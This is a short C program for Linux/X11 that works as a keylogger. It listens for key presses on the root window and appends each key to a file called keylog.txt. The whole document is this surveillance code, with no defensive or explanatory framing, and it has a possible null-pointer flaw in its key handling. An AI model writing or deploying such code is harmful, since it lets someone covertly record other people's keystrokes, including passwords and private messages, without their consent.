#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    Display* display = XOpenDisplay(NULL);
    if (!display) return 1;

    FILE* log = fopen("keylog.txt", "a+");
    if (!log) return 1;

    // Capture all keyboard events
    XSelectInput(display, DefaultRootWindow(display),
                 KeyPressMask | KeyReleaseMask);

    XEvent event;
    while (1) {
        XNextEvent(display, &event);

        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            const char* key = XKeysymToString(keysym);

            // Log regular characters
            if (strlen(key) == 1) {
                fprintf(log, "%s", key);
            } else {
                fprintf(log, "[%s]", key);
            }
            fflush(log);
        }
    }

    fclose(log);
    XCloseDisplay(display);
    return 0;
}
